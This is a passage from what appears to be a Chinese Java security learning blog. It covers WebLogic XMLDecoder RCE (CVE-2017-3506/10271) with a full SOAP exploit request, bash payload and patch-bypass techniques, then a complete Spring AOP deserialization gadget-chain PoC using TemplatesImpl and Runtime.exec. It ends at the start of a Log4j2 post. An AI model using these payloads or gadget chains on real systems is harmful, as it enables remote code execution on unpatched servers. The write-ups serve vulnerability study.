\u003carray class=\"java.lang.String\" length=\"1\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003eCalc\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e 解析这个xml，相当于用 java.lang.ProcessBuilder 来 rce，相当于执行以下代码 String[] cmd = new String[1]; cmd[0] = \"Calc\"; new ProcessBuilder(cmd).start(); 漏洞复现\r下面几个路由都能解析 xml /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 POST 请求包 POST /wls-wsat/RegistrationRequesterPortType11 HTTP/1.1 Host: 192.168.2.128:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: ADMINCONSOLESESSION=pG6NyP1TRTBQpCtbTcGdmT4FHw76PxC1nn6WrKbLVGhQ1LtxJLJv!441898134 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: text/xml Content-Length: 680 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Header\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e \u003carray class=\"java.lang.String\" length=\"3\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003e/bin/bash\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"1\"\u003e \u003cstring\u003e-c\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"2\"\u003e \u003cstring\u003eecho \"/wls-wsat/RegistrationRequesterPortType11\"\u003e\u003e/tmp/eeee\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e \u003c/work:WorkContext\u003e \u003c/soapenv:Header\u003e \u003csoapenv:Body/\u003e \u003c/soapenv:Envelope\u003e 根据要执行的命令调整 index 和对应的参数就好了 稍微解释一下以上 poc ，xml 部分不多说，说下SOAP 请求结构 Envelope：定义了 SOAP 消息的外层结构，使用的是标准的 SOAP Envelope 命名空间。 Header：SOAP 消息中用来包含头部信息，这里特别使用了 WorkContext，这是 WebLogic Server 特有的机制，用于在 SOAP 请求中传递上下文或状态信息。 所以这个洞的本质其实是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象，从而触发任意代码执行 代码分析\rserver/lib/wls-wsat.war/WEB-INF/web.xml 中的接口都能对 SOAP 报文进行处理，也就是刚才那几个存在漏洞的路由接口 定位到 weblogic.wsee.jaxws.workcontext.WorkContextServerTube 的 processRequest 方法，这里对我们 POST 数据包中的 SOAP 数据进行了处理 这里可以看到 var1 就是我们传入的 xml 数据，var2 就是筛选出了XML 中 \u003csoapenv:Header\u003e 标签下的所有子元素 然后把 var3 放进了 readHeaderOld() 方法进行处理 protected void readHeaderOld(Header var1) { try { XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); } catch (XMLStreamException var7) { throw new WebServiceException(var7); } catch (IOException var8) { throw new WebServiceException(var8); } } 先是创建了个用来读 xml 的 var2，然后创建了输入流和输出流，将 xml 数据写到 var4 中，最后就是 var6 的构造了，跟进 WorkContextXmlInputAdapter public WorkContextXmlInputAdapter(InputStream var1) { this.xmlDecoder = new XMLDecoder(var1); } new 了个 XMLDecoder，并将 var4 写进去了，然后跟进 receive 方法 protected void receive(WorkContextInput var1) throws IOException { WorkContextMapIntercept","date":"2025-05-11","objectID":"/posts/705d533/:3:3","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"漏洞修复\rCVE-2017-3506 补丁分析\r在 weblogic.wsee.workarea.WorkContextXmlInputAdapter 中添加了 validate 验证，限制了 object 标签 private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid context type: object\"); } } }); } catch (ParserConfigurationException var5) { throw new IllegalStateException(\"Parser Exception\", var5); } catch (SAXException var6) { throw new IllegalStateException(\"Parser Exception\", var6); } catch (IOException var7) { throw new IllegalStateException(\"Parser Exception\", var7); } } 将 object 修改成 void 即可绕过，比如像 payload 中用 ProcessBuilder.start() 这种没有返回值的方法来 rce时就能用 void 来绕过，用 new 也是可以的 \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cnew class=\"java.lang.ProcessBuilder\"\u003e \u003cstring\u003ecalc\u003c/string\u003e \u003cmethod name=\"start\" /\u003e \u003c/new\u003e \u003c/java\u003e CVE-2017-10271 补丁分析\rprivate void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid element qName:object\"); } else if(qName.equalsIgnoreCase(\"new\")) { throw new IllegalStateException(\"Invalid element qName:new\"); } else if(qName.equalsIgnoreCase(\"method\")) { throw new IllegalStateException(\"Invalid element qName:method\"); } else { if(qName.equalsIgnoreCase(\"void\")) { for(int attClass = 0; attClass \u003c attributes.getLength(); ++attClass) { if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) { throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass)); } } } if(qName.equalsIgnoreCase(\"array\")) { String var9 = attributes.getValue(\"class\"); if(var9 != null \u0026\u0026 !var9.equalsIgnoreCase(\"byte\")) { throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); } 还是黑名单，又加了几个标签，参看xmldecoder的官方文档很容易发现 class 标签可以动态加载任意类 根据上面补丁的要求，我们知道所利用的类需要满足构造方法存在利用点，且其构造方法的参数类型恰好是字节数组或者是java中的基础数据类型，比如string，int这些，刚好 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 就满足 直接将传入的数据反序列化了，weblogic存在一个自带jre环境的版本，且自带的jdk版本为1.6+，可以利用jdk7u21 gadget达到RCE，也可以打 cc，之前在 T3 的时候就知道能打部分 cc，而且weblogic还有 spring 的组件，可以利用FileSystemXmlApplicationContext和ClassPathXmlApplicationContext类加载spring的配置文件，打spring的依赖注入 后续的ban了class标签，还可以通过 \u003carray method=\"forName\"\u003e 来绕过，貌似只有 jdk1.6 能打，因为其XMLDecoder与高版本的不同 最后就索性也限制了array元素的长度 据此，有佬给出了XMLDecoder官方文档的一句话 但貌似不行，如果超出了指定的 length ，应该还是会报错，暂时不深究了 ","date":"2025-05-11","objectID":"/posts/705d533/:3:4","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"小结\r原理也说过，就是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象（反序列化），从而触发任意代码执行。用于处理 SOAP 报文的那几个路由都能打，后续绕过的话就是翻 XMLDecoder 官方文档找黑名单外的标签，比如过滤了 object ，就要 void 、new 来绕过，都禁用了，用 class 来动态加载类，最后还可以 \u003carray method=\"forName\"\u003e 来绕过 class，但所需的 jdk 版本太低了，感觉越到后面越没啥用 ","date":"2025-05-11","objectID":"/posts/705d533/:3:5","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"参考\rhttps://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/ https://xz.aliyun.com/news/4656 https://www.freebuf.com/vuls/206374.html https://xz.aliyun.com/news/4656 ","date":"2025-05-11","objectID":"/posts/705d533/:3:6","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"总结\r没什么好说的，感觉利用面比较窄，也没打过啥实战，也不清楚其实 ","date":"2025-05-11","objectID":"/posts/705d533/:4:0","tags":["Java"],"title":"Weblogic学习(1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"SpringAOP链\r","date":"2025-05-11","objectID":"/posts/816babd/:1:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"前言\r年初还是去年末就看到有佬发了，标题叫啥 Spring 原生链，感觉实战挺有用的，最近也有很多文章在分析这个，就来学学 ","date":"2025-05-11","objectID":"/posts/816babd/:2:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"简介\r详情参考：https://blog.csdn.net/Cr1556648487/article/details/126777903 AOP（Aspect Orient Programming），直译过来就是 面向切面编程，AOP 是一种编程思想，是面向对象编程（OOP）的一种补充 面向切面编程，实现在不修改源代码的情况下给程序动态统一添加额外功能的一种技术，AOP可以拦截指定的方法并且对方法增强，而且无需侵入到业务代码中，使业务与非业务处理逻辑分离，比如Spring的事务，通过事务的注解配置，Spring会自动在业务方法中开启、提交业务，并且在业务处理失败时，执行相应的回滚策略。 主要应用场景在日志记录、事务管理、权限验证、性能监测 Spring的AOP实现原理其实很简单，就是通过动态代理实现的，其采用了两种混合的实现方式：JDK 动态代理和 CGLib 动态代理。 JDK动态代理：Spring AOP的首选方法。 每当目标对象实现一个接口时，就会使用JDK动态代理。目标对象必须实现接口 CGLIB代理：如果目标对象没有实现接口，则可以使用CGLIB代理。 ","date":"2025-05-11","objectID":"/posts/816babd/:3:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"环境搭建\r只需要添加 spring-boot-starter-aop 这个依赖，这个依赖包括spring-aop和aspectJWeaver这两个所需依赖 \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-aop\u003c/artifactId\u003e \u003cversion\u003e3.3.10\u003c/version\u003e \u003c/dependency\u003e ","date":"2025-05-11","objectID":"/posts/816babd/:4:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"调用链分析\r","date":"2025-05-11","objectID":"/posts/816babd/:5:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"sink点AbstractAspectJAdvice\rsink 点是 org.springframework.aop.aspectj 包下的 AbstractAspectJAdvice 类中的 invokeAdviceMethodWithGivenArgs 方法 protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable { Object[] actualArgs = args; if (this.aspectJAdviceMethod.getParameterCount() == 0) { actualArgs = null; } try { ReflectionUtils.makeAccessible(this.aspectJAdviceMethod); return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); } catch (IllegalArgumentException var4) { throw new AopInvocationException(\"Mismatch on arguments to advice method [\" + this.aspectJAdviceMethod + \"]; pointcut expression [\" + this.pointcut.getPointcutExpression() + \"]\", var4); } catch (InvocationTargetException var5) { throw var5.getTargetException(); } } 这里很明显直接就反射调用了 这里 this.aspectJAdviceMethod 在构造函数中定义 这个类继承了 Serializable 接口的，是个抽象类，其子类为 在这几个子类中我们可以发现 AspectJAroundAdvice 的 invoke 方法调用了 invokeAdviceMethod，然后就会触发 invokeAdviceMethodWithGivenArgs，而且这里对 aspectJAroundAdviceMethod 的赋值也很简单，直接传就好了 反射调用方法的三要素：method、obj、args，现在 method 有了， args 先不说，有的是无参方法用，看看怎么实现 obj，跟进看下 this.aspectInstanceFactory 的实现 private final AspectInstanceFactory aspectInstanceFactory; 是一个 AspectInstanceFactory 类型的值，继续跟进，发现其是个接口，有几个实现类 现在我们的目标是找到一个同时实现 AspectInstanceFactory 和 Serializable 的子类，并且 getAspectInstance 方法可以返回指定的对象，刚好 SingletonAspectInstanceFactory 就满足 因此就可以基本确定 org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs 为最终的 sink 点 ","date":"2025-05-11","objectID":"/posts/816babd/:5:1","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"中间链分析\r可以跟进一下上面确定的sink点，可以跟到 org.springframework.aop.framework.ReflectiveMethodInvocation#proceed 中，其调用链为 org.springframework.aop.framework.ReflectiveMethodInvocation#proceed-\u003e org.springframework.aop.aspectj.AspectJAroundAdvice#invoke-\u003e org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethod(org.aspectj.lang.JoinPoint, org.aspectj.weaver.tools.JoinPointMatch, java.lang.Object, java.lang.Throwable)-\u003e org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs 看到 org.springframework.aop.framework.ReflectiveMethodInvocation#proceed 方法 @Nullable public Object proceed() throws Throwable { if (this.currentInterceptorIndex == this.interceptorsAndDynamicMethodMatchers.size() - 1) { return this.invokeJoinpoint(); } else { Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(++this.currentInterceptorIndex); if (interceptorOrInterceptionAdvice instanceof InterceptorAndDynamicMethodMatcher) { InterceptorAndDynamicMethodMatcher dm = (InterceptorAndDynamicMethodMatcher)interceptorOrInterceptionAdvice; Class\u003c?\u003e targetClass = this.targetClass != null ? this.targetClass : this.method.getDeclaringClass(); return dm.methodMatcher.matches(this.method, targetClass, this.arguments) ? dm.interceptor.invoke(this) : this.proceed(); } else { return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this); } } } 这里我们要让 interceptorOrInterceptionAdvice 对象为 AspectJAroundAdvice 。可以看到 interceptorOrInterceptionAdvice 对象是从 this.interceptorsAndDynamicMethodMatchers 这个 List 中拿出来的，可以在 ReflectiveMethodInvocation 中的构造方法中对其赋值 但是这里 ReflectiveMethodInvocation 本身并没有实现 Serializable 接口，想要在反序列化过程中使用，只能依赖于动态创建。可以在 org.springframework.aop.framework.JdkDynamicAopProxy#invoke 中发现 这里刚好实例化了 ReflectiveMethodInvocation 类，并且又调用了其 proceed 方法，而且恰好这个类又能用来实现动态创建，而且还实现了 Serializable 接口，所以这里就是 source 点 分析完毕后，回到刚才的 org.springframework.aop.framework.ReflectiveMethodInvocation 中，这里要走到 return ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this); 需要避免实现两个 if 语句，进入第一个 if 语句时只要 List 中有一个值就能跳出。第二个 if 语句，我们这里 interceptorOrInterceptionAdvice 对象为 AspectJAroundAdvice，所以这里也是跳出，故而无需做何操作即可调用 ((MethodInterceptor)interceptorOrInterceptionAdvice).invoke(this) ","date":"2025-05-11","objectID":"/posts/816babd/:5:2","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"source点JdkDynamicAopProxy\r来到 org.springframework.aop.framework 包下的 JdkDynamicAopProxy ，看到其 invoke 方法，注意到其调用 proceed 方法处 MethodInvocation invocation = new ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain); retVal = invocation.proceed(); 我们要实现interceptorOrInterceptionAdvice 对象为 AspectJAroundAdvice，也就是说只要关注 chain 的赋值即可 List\u003cObject\u003e chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); 跟进看看 getInterceptorsAndDynamicInterceptionAdvice 方法的实现 public List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Method method, @Nullable Class\u003c?\u003e targetClass) { MethodCacheKey cacheKey = new MethodCacheKey(method); List\u003cObject\u003e cached = (List)this.methodCache.get(cacheKey); if (cached == null) { cached = this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice(this, method, targetClass); this.methodCache.put(cacheKey, cached); } return cached; } 可以看到所以这里 cached 有两种获取方式，一种是从 this.methodCache 直接获取已经缓存好的，或者是用 this.advisorChainFactory.getInterceptorsAndDynamicInterceptionAdvice 直接创建个新的 先看第一种 private transient Map\u003cMethodCacheKey, List\u003cObject\u003e\u003e methodCache; ...... private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); this.methodCache = new ConcurrentHashMap(32); } methodCache 属性有transient修饰符，不参与序列化过程，而且 readObject 里也是没有办法修改其值 那看第二种，跟进看看 public interface AdvisorChainFactory { List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u003c?\u003e targetClass); } 是个接口类，跟进其实现类 DefaultAdvisorChainFactory ，看到其 getInterceptorsAndDynamicInterceptionAdvice 方法 public List\u003cObject\u003e getInterceptorsAndDynamicInterceptionAdvice(Advised config, Method method, @Nullable Class\u003c?\u003e targetClass) { AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); Advisor[] advisors = config.getAdvisors(); List\u003cObject\u003e interceptorList = new ArrayList(advisors.length); Class\u003c?\u003e actualClass = targetClass != null ? targetClass : method.getDeclaringClass(); Boolean hasIntroductions = null; Advisor[] var9 = advisors; int var10 = advisors.length; for(int var11 = 0; var11 \u003c var10; ++var11) { Advisor advisor = var9[var11]; if (advisor instanceof PointcutAdvisor) { PointcutAdvisor pointcutAdvisor = (PointcutAdvisor)advisor; if (config.isPreFiltered() || pointcutAdvisor.getPointcut().getClassFilter().matches(actualClass)) { MethodMatcher mm = pointcutAdvisor.getPointcut().getMethodMatcher(); boolean match; if (mm instanceof IntroductionAwareMethodMatcher) { if (hasIntroductions == null) { hasIntroductions = hasMatchingIntroductions(advisors, actualClass); } match = ((IntroductionAwareMethodMatcher)mm).matches(method, actualClass, hasIntroductions); } else { match = mm.matches(method, actualClass); } if (match) { MethodInterceptor[] interceptors = registry.getInterceptors(advisor); if (mm.isRuntime()) { MethodInterceptor[] var17 = interceptors; int var18 = interceptors.length; for(int var19 = 0; var19 \u003c var18; ++var19) { MethodInterceptor interceptor = var17[var19]; interceptorList.add(new InterceptorAndDynamicMethodMatcher(interceptor, mm)); } } else { interceptorList.addAll(Arrays.asList(interceptors)); } } } } else if (advisor instanceof IntroductionAdvisor) { IntroductionAdvisor ia = (IntroductionAdvisor)advisor; if (config.isPreFiltered() || ia.getClassFilter().matches(actualClass)) { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } else { Interceptor[] interceptors = registry.getInterceptors(advisor); interceptorList.addAll(Arrays.asList(interceptors)); } } return interceptorList; } 最后返回的是 interceptorList ，有四处 add 方法，每次 add 前都会用 registry.getInterceptors(advisor) 生成元素，看下 registry 怎么赋值 AdvisorAdapterRegistry registry = GlobalAdvisorAdapterRegistry.getInstance(); 是个静态方法，直接返回 DefaultAdvisorAdapterRegistry 实例，继续跟进到其 getInterceptors 方法 public MethodInterceptor[] getInterceptors(Advisor advisor) throws UnknownAdviceTypeException { Li","date":"2025-05-11","objectID":"/posts/816babd/:5:3","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"poc\r调用无参方法的话，还是用 TemplatesImpl 加载字节码好了，用 javassist 来构造字节码 ClassPool classpool = ClassPool.getDefault(); classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass ctClass = classpool.makeClass(\"poc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName())); ctClass.makeClassInitializer().insertBefore(cmd); byte[] bytecode = ctClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytecode}); setFieldValue(templates, \"_name\", \"6s6\"); 套第一层 JdkDynamicAopProxy 动态代理 public static Object getProxy1(Object obj, Class[] clazzs) throws Exception { //设置代理对象 AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler); } 让 advisor实现MethodInterceptor和advice接口，并套第二层JdkDynamicAopProxy 动态代理 public static Object getProxy2(Object obj, Class\u003c?\u003e clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor( (Advice) getProxy1(obj, new Class[]{MethodInterceptor.class, Advice.class}) ); advisedSupport.addAdvisor(advisor); Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); return java.lang.reflect.Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); } 构造恶意的 AspectJAroundAdvice ，确保触发其 invoke 方法时能调用 TemplatesImpl.newTransformer() Method Tem_newTransformer = TemplatesImpl.class.getMethod(\"newTransformer\"); SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(templates); AspectJAroundAdvice advice = new AspectJAroundAdvice(Tem_newTransformer, new AspectJExpressionPointcut(), factory); 让 advice 实现 Advice 接口 Object proxy1 = getProxy2(advice, Advice.class); 综上，完整poc package test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class poc { public static void main(String args[]) throws Exception { ClassPool classpool = ClassPool.getDefault(); classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass ctClass = classpool.makeClass(\"poc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; ctClass.setSuperclass(classpool.get(AbstractTranslet.class.getName())); ctClass.makeClassInitializer().insertBefore(cmd); byte[] bytecode = ctClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytecode}); setFieldValue(templates, \"_name\", \"6s6\"); Method Tem_newTransformer = TemplatesImpl.class.getMethod(\"newTransformer\"); SingletonAspectInstanceFactory factory = ne","date":"2025-05-11","objectID":"/posts/816babd/:6:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"总结\r核心其实就是两层代理，最外层代理的作用是，在反序列化触发 BadAttributeValueExpException 时会调用任意方法的 toString 方法，可以触发其代理类 JdkDynamicAopProxy 的 invoke 方法 而最内层则仅仅是为了让内层的 advisor 能满足两个接口实现，让链子正常继续下去 调用栈 newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeAdviceMethodWithGivenArgs:634, AbstractAspectJAdvice (org.springframework.aop.aspectj) invokeAdviceMethod:624, AbstractAspectJAdvice (org.springframework.aop.aspectj) invoke:72, AspectJAroundAdvice (org.springframework.aop.aspectj) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeJoinpointUsingReflection:344, AopUtils (org.springframework.aop.support) invoke:208, JdkDynamicAopProxy (org.springframework.aop.framework) invoke:-1, $Proxy0 (com.sun.proxy) proceed:186, ReflectiveMethodInvocation (org.springframework.aop.framework) invoke:215, JdkDynamicAopProxy (org.springframework.aop.framework) toString:-1, $Proxy1 (com.sun.proxy) readObject:86, BadAttributeValueExpException (javax.management) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:483, Method (java.lang.reflect) invokeReadObject:1017, ObjectStreamClass (java.io) readSerialData:1896, ObjectInputStream (java.io) readOrdinaryObject:1801, ObjectInputStream (java.io) readObject0:1351, ObjectInputStream (java.io) readObject:371, ObjectInputStream (java.io) unser:87, poc (test) main:45, poc (test) ","date":"2025-05-11","objectID":"/posts/816babd/:7:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"参考\rhttps://mp.weixin.qq.com/s/oQ1mFohc332v8U1yA7RaMQ https://gsbp0.github.io/post/springaop/ ","date":"2025-05-11","objectID":"/posts/816babd/:8:0","tags":["Java"],"title":"SpringAOP链学习","uri":"/posts/816babd/"},{"categories":["Java"],"content":"Log4j2（CVE-2021-44228）\r","date":"2025-04-13","objectID":"/posts/cde7a8a/:1:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"前言\r没学 java 就知道这个漏洞，应该还有不少的解析和绕过，这里就简单先了解下最基础的 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:2:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"简介\rlog4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。 其被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出${data:MM-dd-yyyy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi ","date":"2025-04-13","objectID":"/posts/cde7a8a/:3:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"影响版本\r2.0 \u003c= Apache log4j2 \u003c= 2.14.1 ","date":"2025-04-13","objectID":"/posts/cde7a8a/:4:0","tags":["Java"],"title":"Log4j2漏洞学习","uri":"/posts/cde7a8a/"},{"categories":["Java"],"content":"环境搭建\rpom.xml \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003ejunit\u003c/groupId\u003e \u003cartifactId\u003ejunit\u003c/artifactId\u003e \u003cversion\u003e4.12\u003c/version\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e 再写个xml文件来实现log4j2（yaml等文件也行），默认文件名为log4j2.xml，放在 src/main/resources 目录下 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!-- log4j2 配置文件 --\u003e \u003c!-- 日志级别 trace\u003cdebug\u003cinfo\u003cwarn\u003cerror\u003cfatal --\u003e\u003cconfiguration status=\"info\"\u003e \u003c!-- 自定义属性 --\u003e \u003cProperties\u003e \u003c!-- 日志格式(控制台) --\u003e \u003cProperty name=\"pattern1\"\u003e[%-5p] %d %c - %m%n\u003c/Property\u003e \u003c!-- 日志格式(文件) --\u003e \u003cProperty name=\"pattern2\"\u003e =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n \u003c/Property\u003e \u003c!-- 日志文件路径 --\u003e \u003cProperty name=\"filePath\"\u003elogs/myLog.log\u003c/Property\u003e \u003c/Properties\u003e \u003cappenders\u003e \u003cConsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e \u003cPatternLayout pattern=\"${pattern1}\"/\u003e \u003c/Console\u003e \u003cRollingFile name=\"RollingFile\" fileName=\"${filePath}\" filePattern=\"logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz\"\u003e 